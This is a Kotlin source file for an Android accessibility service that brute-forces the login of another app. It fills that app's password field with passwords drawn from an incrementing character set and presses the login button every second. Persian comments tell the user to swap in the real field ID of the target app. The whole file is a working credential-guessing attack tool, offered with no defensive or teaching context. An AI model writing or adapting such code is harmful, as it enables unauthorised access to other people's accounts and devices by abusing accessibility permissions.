package com.example.bruteforce

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.os.Handler
import android.os.Looper
import android.text.InputType
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

class BruteForceService : AccessibilityService() {

    private val handler = Handler(Looper.getMainLooper())
    private var charset = buildCharset()
    private var currentPassword = mutableListOf(0)

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null || event.source == null) return

        val root = rootInActiveWindow ?: return

        // جایگزین با ID فیلد واقعی رمز عبور
        val passwordFields = root.findAccessibilityNodeInfosByViewId("com.example.targetapp:id/password_field")
        val loginButtons = root.findAccessibilityNodeInfosByViewId("com.example.targetapp:id/login_button")

        if (passwordFields.isNotEmpty() && loginButtons.isNotEmpty()) {
            val passwordField = passwordFields[0]
            val loginButton = loginButtons[0]

            val password = currentPassword.joinToString("") { charset[it].toString() }

            passwordField.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, android.os.Bundle().apply {
                putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, password)
            })

            handler.postDelayed({
                loginButton.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                incrementPassword()
            }, 1000)
        }
    }

    override fun onInterrupt() {}

    override fun onServiceConnected() {
        serviceInfo = serviceInfo.apply {
            eventTypes = AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or AccessibilityEvent.TYPE_VIEW_CLICKED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
            packageNames = null // می‌تونی محدودش کنی به اپ خاص
        }
    }

    private fun buildCharset(): List<Char> {
        val chars = mutableListOf<Char>()
        chars.addAll('0'..'9')
        chars.addAll('a'..'z')
        chars.addAll('A'..'Z')
        chars.addAll(listOf('!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '-', '_', '=', '+', '[', ']', '{', '}', ';', ':', '\'', '"', ',', '.', '<', '>', '/', '?', '\\', '|', '`', '~'))
        return chars
    }

    private fun incrementPassword() {
        var index = currentPassword.size - 1
        while (index >= 0) {
            if (currentPassword[index] < charset.lastIndex) {
                currentPassword[index]++
                return
            } else {
                currentPassword[index] = 0
                index--
            }
        }
        currentPassword.add(0)
    }
}
